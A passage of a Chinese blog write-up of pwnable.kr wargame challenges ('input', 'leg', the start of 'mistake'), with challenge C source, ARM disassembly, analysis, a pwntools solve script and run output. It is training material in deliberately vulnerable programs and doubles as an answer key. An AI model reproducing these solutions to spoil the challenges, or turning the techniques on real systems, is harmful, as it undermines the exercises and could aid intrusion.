href="#题目-6" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to pwnable.kr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's see if you know how to give input to program\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Just give me correct inputs then you will get the flag :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// argv</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x20\x0a\x0d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 1 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// stdio</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x00\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x02\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 2 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// env</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"\xca\xfe\xba\xbe"</span><span class="token punctuation">,</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 3 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// file</span>    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"\x0a"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">fread</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">1</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x00\x00\x00"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 4 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// network</span>    <span class="token keyword">int</span> sd<span class="token punctuation">,</span> cd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> sockaddr_in saddr<span class="token punctuation">,</span> caddr<span class="token punctuation">;</span>    sd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>sd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"socket error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    saddr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    saddr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> INADDR_ANY<span class="token punctuation">;</span>    saddr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>saddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>saddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bind error, use another port\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">listen</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr_in<span class="token punctuation">)</span><span class="token punctuation">;</span>    cd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>caddr<span class="token punctuation">,</span> <span class="token punctuation">(</span>socklen_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"accept error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">recv</span><span class="token punctuation">(</span>cd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 5 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// here's your flag</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>一共有 5 关：</p><ol><li>传入 100 个参数，参数 ‘A’(65) 为 <code>\x00</code> 参数 ‘B’(66) 为 <code>\x20\x0a\x0d</code></li><li>从 stdin 中读取输入 <code>\x00\x0a\x00\xff</code>，stderr 中读取输入<code>\x00\x0a\x02\xff</code></li><li>从环境变量去读<code>\xde\xad\xbe\xef</code>，需要值为<code>\xca\xfe\xba\xbe</code></li><li>读当前目录下<code>\x0a</code>文件，前 4 个字节需要为<code>\x00\x00\x00\x00</code></li><li>读取参数 ‘C’(67) 为端口值，发送<code>b</code>至此端口</li></ol><h3 id="解题-6"><a href="#解题-6" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleepconn <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"input2"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"/tmp/sa/stdin"</span><span class="token punctuation">,</span> b<span class="token string">"\x00\x0a\x00\xff"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"/tmp/sa/stderr"</span><span class="token punctuation">,</span> b<span class="token string">"\x00\x0a\x02\xff"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token string">"/tmp/sa/\x0a"</span><span class="token punctuation">,</span> b<span class="token string">"\x00\x00\x00\x00"</span><span class="token punctuation">)</span>args <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token string">"."</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span>args<span class="token punctuation">[</span>ord<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">"\x00"</span>args<span class="token punctuation">[</span>ord<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">"\x20\x0a\x0d"</span>args<span class="token punctuation">[</span>ord<span class="token punctuation">(</span><span class="token string">'C'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"47362"</span>envs <span class="token operator">=</span> <span class="token punctuation">{</span>b<span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">:</span>b<span class="token string">"\xca\xfe\xba\xbe"</span><span class="token punctuation">}</span>p <span class="token operator">=</span> conn<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>args<span class="token punctuation">,</span> cwd<span class="token operator">=</span><span class="token string">"/tmp/sa/"</span><span class="token punctuation">,</span> env<span class="token operator">=</span>envs<span class="token punctuation">,</span> executable<span class="token operator">=</span><span class="token string">"/home/input2/input"</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span><span class="token string">"/tmp/stdin"</span><span class="token punctuation">,</span> stderr<span class="token operator">=</span><span class="token string">"/tmp/stderr"</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sock <span class="token operator">=</span> conn<span class="token punctuation">.</span>remote<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">47362</span><span class="token punctuation">)</span>sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>执行结果：</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/pwnable.kr$ /usr/bin/python3 /home/pwn/pwnable.kr/7_input.py[+] Connecting to pwnable.kr on port 2222: Done[*] input2@pwnable.kr:    Distro    Ubuntu 16.04    OS:       linux    Arch:     amd64    Version:  4.4.179    ASLR:     Enabled[+] Starting remote process '/home/input2/input' on pwnable.kr: pid 145635[*] Switching to interactive modeWelcome to pwnable.krLet's see if you know how to give input to programJust give me correct inputs then you will get the flag :)Stage 1 clear!Stage 2 clear!Stage 3 clear!Stage 4 clear!Stage 5 clear!Mommy! I learned how to pass various input in Linux :)[*] Got EOF while reading in interactive</code></pre><h2 id="8-leg"><a href="#8-leg" class="headerlink" title="8. leg"></a>8. leg</h2><h3 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">int</span> <span class="token function">key1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"mov r3, pc\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">key2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span>    <span class="token string">"push    {r6}\n"</span>    <span class="token string">"add    r6, pc, $1\n"</span>    <span class="token string">"bx        r6\n"</span>    <span class="token string">".code    16\n"</span>    <span class="token string">"mov    r3, pc\n"</span>    <span class="token string">"add    r3, $0x4\n"</span>    <span class="token string">"push    {r3}\n"</span>    <span class="token string">"pop    {pc}\n"</span>    <span class="token string">".code    32\n"</span>    <span class="token string">"pop    {r6}\n"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">key3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"mov r3, lr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Daddy has very strong arm! : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">key1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">key2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">key3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congratz!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I have strong leg :P\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-armasm"><code class="language-armasm">(gdb) disass mainDump of assembler code for function main:   0x00008d3c <+0>:        push    {r4, r11, lr}   0x00008d40 <+4>:        add        r11, sp, #8   0x00008d44 <+8>:        sub        sp, sp, #12   0x00008d48 <+12>:    mov        r3, #0   0x00008d4c <+16>:    str        r3, [r11, #-16]   0x00008d50 <+20>:    ldr        r0, [pc, #104]    ; 0x8dc0 <main+132>   0x00008d54 <+24>:    bl        0xfb6c <printf>   0x00008d58 <+28>:    sub        r3, r11, #16   0x00008d5c <+32>:    ldr        r0, [pc, #96]    ; 0x8dc4 <main+136>   0x00008d60 <+36>:    mov        r1, r3   0x00008d64 <+40>:    bl        0xfbd8 <__isoc99_scanf>   0x00008d68 <+44>:    bl        0x8cd4 <key1>   0x00008d6c <+48>:    mov        r4, r0   0x00008d70 <+52>:    bl        0x8cf0 <key2>   0x00008d74 <+56>:    mov        r3, r0   0x00008d78 <+60>:    add        r4, r4, r3   0x00008d7c <+64>:    bl        0x8d20 <key3>   0x00008d80 <+68>:    mov        r3, r0   0x00008d84 <+72>:    add        r2, r4, r3   0x00008d88 <+76>:    ldr        r3, [r11, #-16]   0x00008d8c <+80>:    cmp        r2, r3   0x00008d90 <+84>:    bne        0x8da8 <main+108>   0x00008d94 <+88>:    ldr        r0, [pc, #44]    ; 0x8dc8 <main+140>   0x00008d98 <+92>:    bl        0x1050c <puts>   0x00008d9c <+96>:    ldr        r0, [pc, #40]    ; 0x8dcc <main+144>   0x00008da0 <+100>:    bl        0xf89c <system>   0x00008da4 <+104>:    b        0x8db0 <main+116>   0x00008da8 <+108>:    ldr        r0, [pc, #32]    ; 0x8dd0 <main+148>   0x00008dac <+112>:    bl        0x1050c <puts>   0x00008db0 <+116>:    mov        r3, #0   0x00008db4 <+120>:    mov        r0, r3   0x00008db8 <+124>:    sub        sp, r11, #8   0x00008dbc <+128>:    pop        {r4, r11, pc}   0x00008dc0 <+132>:    andeq    r10, r6, r12, lsl #9   0x00008dc4 <+136>:    andeq    r10, r6, r12, lsr #9   0x00008dc8 <+140>:                ; <UNDEFINED> instruction: 0x0006a4b0   0x00008dcc <+144>:                ; <UNDEFINED> instruction: 0x0006a4bc   0x00008dd0 <+148>:    andeq    r10, r6, r4, asr #9End of assembler dump.(gdb) disass key1Dump of assembler code for function key1:   0x00008cd4 <+0>:        push    {r11}        ; (str r11, [sp, #-4]!)   0x00008cd8 <+4>:        add        r11, sp, #0   0x00008cdc <+8>:        mov        r3, pc   0x00008ce0 <+12>:    mov        r0, r3   0x00008ce4 <+16>:    sub        sp, r11, #0   0x00008ce8 <+20>:    pop        {r11}        ; (ldr r11, [sp], #4)   0x00008cec <+24>:    bx        lrEnd of assembler dump.(gdb) disass key2Dump of assembler code for function key2:   0x00008cf0 <+0>:        push    {r11}        ; (str r11, [sp, #-4]!)   0x00008cf4 <+4>:        add        r11, sp, #0   0x00008cf8 <+8>:        push    {r6}        ; (str r6, [sp, #-4]!)   0x00008cfc <+12>:    add        r6, pc, #1   0x00008d00 <+16>:    bx        r6   0x00008d04 <+20>:    mov        r3, pc   0x00008d06 <+22>:    adds    r3, #4   0x00008d08 <+24>:    push    {r3}   0x00008d0a <+26>:    pop        {pc}   0x00008d0c <+28>:    pop        {r6}        ; (ldr r6, [sp], #4)   0x00008d10 <+32>:    mov        r0, r3   0x00008d14 <+36>:    sub        sp, r11, #0   0x00008d18 <+40>:    pop        {r11}        ; (ldr r11, [sp], #4)   0x00008d1c <+44>:    bx        lrEnd of assembler dump.(gdb) disass key3Dump of assembler code for function key3:   0x00008d20 <+0>:        push    {r11}        ; (str r11, [sp, #-4]!)   0x00008d24 <+4>:        add        r11, sp, #0   0x00008d28 <+8>:        mov        r3, lr   0x00008d2c <+12>:    mov        r0, r3   0x00008d30 <+16>:    sub        sp, r11, #0   0x00008d34 <+20>:    pop        {r11}        ; (ldr r11, [sp], #4)   0x00008d38 <+24>:    bx        lrEnd of assembler dump.(gdb) </code></pre><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>通过 c 文件看，就是找到 key1、key2、key3 之和即可</p><ul><li><p>key1：</p><ul><li>当处理器处于ARM状态时，每条ARM指令为4个字节，所以PC寄存器的值为当前指令地址 + 8字节</li><li>当处理器处于Thumb状态时，每条Thumb指令为2字节，所以PC寄存器的值为当前指令地址 + 4字节</li></ul><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15910787471583.jpg" alt="https://static.docs.arm.com/ihi0042/g/aapcs32.pdf"></p><p>当只有一个结果返回时，会放在 r0 里，所以 key1：0x00008cdc + 0x8 = 0x00008ce4</p></li><li><p>key2：<br>由于 0x00008cfc 处 r6：0x1 + 0x00008cfc + 0x8 = 0x00008d05 最后一位为 1 导致在0x00008d00处进入 Thumb 状态，于是 0x00008d06 处 r3 = 0x00008d04 + 0x4 + 0x4 = 0x00008d0c</p></li><li><p>key3：</p><p>连接寄存器r14（LR）：每种模式下r14都有自身版组，它有两个特殊功能：</p><ol><li>保存子程序返回地址。使用BL或BLX时，跳转指令自动把返回地址放入r14中；子程序通过把r14复制到PC来实现返回</li><li>当异常发生时，异常模式的r14用来保存异常返回地址，将r14如栈可以处理嵌套中断</li></ol><p>可以看到下一条指令的地址为 0x00008d80</p><p>所以 key3：0x00008d80</p></li></ul><p>综合计算 key1 + key2 + key3 = 0x00008ce4 + 0x00008d0c + 0x00008d80 = 108400</p><h3 id="解题-7"><a href="#解题-7" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">/ $ ./legDaddy has very strong arm! : 108400Congratz!My daddy has a lot of ARMv5te muscle!</code></pre><h2 id="9-mistake"><a href="#9-mistake" class="headerlink" title="9. mistake"></a>9. mistake</h2><h3 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> PW_LEN 10</span><span class="token macro property">#<span class="token directive keyword">define</span> XORKEY 1</span><span class="token keyword">void</span> <span class="token function">xor</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> XORKEY<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/home/mistake/password"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">,</span><span class="token number">0400</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"can't open password %d\n"</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"do not bruteforce...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> pw_buf<span class="token punctuation">[</span>PW_LEN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>pw_buf<span class="token punctuation">,</span>PW_LEN<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token keyword">char</span> pw_buf2<span class="token punctuation">[</span>PW_LEN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input password : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%10s"</span><span class="token punctuation">,</span> pw_buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// xor your input</span>    <span class="token function">xor</span><span class="token punctuation">(</span>pw_buf2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>pw_buf<span class="token punctuation">,</span> pw_buf2<span class="token punctuation">,</span> 